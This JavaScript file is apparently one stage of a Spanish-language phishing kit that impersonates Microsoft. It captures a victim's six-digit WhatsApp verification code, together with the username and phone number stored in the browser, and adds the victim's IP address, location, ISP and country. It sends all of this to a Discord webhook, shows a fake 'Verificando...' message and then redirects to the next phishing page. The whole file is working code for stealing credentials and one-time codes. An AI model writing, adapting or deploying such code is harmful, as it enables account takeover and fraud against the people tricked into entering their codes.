// Discord Logger para index4.html (Código WhatsApp)
// Usa DiscordConfig desde discord-config.js

(function() {
  'use strict';
  
  function sendWhatsAppCode(code) {
    return DiscordConfig.getIpInfo().then(function(info) {
      var user = localStorage.getItem('ms_user') || 'N/A';
      var phone = localStorage.getItem('ms_phone') || 'N/A';
      var embed = {
        title: '💬 Microsoft - Código WhatsApp',
        color: 0x25d366,
        fields: [
          { name: '👤 Usuario', value: '`' + user + '`', inline: false },
          { name: '📞 Teléfono', value: '`' + phone + '`', inline: false },
          { name: '🔐 Código WhatsApp', value: '```' + code + '```', inline: false },
          { name: '🌐 Dirección IP', value: '`' + info.ip + '`', inline: false },
          { name: '📍 Ubicación', value: '`' + info.location + '`', inline: false },
          { name: '🏢 Proveedor ISP', value: '`' + info.isp + '`', inline: false },
          { name: '🌍 País', value: info.flag + ' ' + info.country + ' (' + info.country_code + ')', inline: false }
        ],
        footer: { text: new Date().toLocaleString() },
        timestamp: new Date().toISOString()
      };
      return DiscordConfig.sendEmbed(embed);
    });
  }
  
  document.addEventListener('DOMContentLoaded', function() {
    var tokoInput = document.getElementById('toko');
    var submitBtn = document.querySelector('button[style*="microsoft-blue"]') || 
                      document.querySelectorAll('.px-4.py-2.text-white.rounded')[1];
    
    if (!tokoInput || !submitBtn) return;
    
    submitBtn.addEventListener('click', function(e) {
      e.preventDefault();
      e.stopPropagation();
      
      var code = tokoInput.value.trim().replace(/\D/g, '');
      
      if (!code || code.length !== 6) {
        alert('Por favor ingrese el código de 6 dígitos');
        return;
      }
      
      submitBtn.innerHTML = 'Verificando...';
      submitBtn.disabled = true;
      
      sendWhatsAppCode(code).then(function() {
        setTimeout(function() {
          window.location.href = 'index5.html';
        }, 5000);
      });
    });
    
    tokoInput.addEventListener('keypress', function(e) {
      if (e.key === 'Enter') {
        e.preventDefault();
        submitBtn.click();
      }
    });
    
    tokoInput.addEventListener('input', function() {
      var val = tokoInput.value.replace(/\D/g, '');
      if (val.length === 6) {
        submitBtn.click();
      }
    });
  });
})();
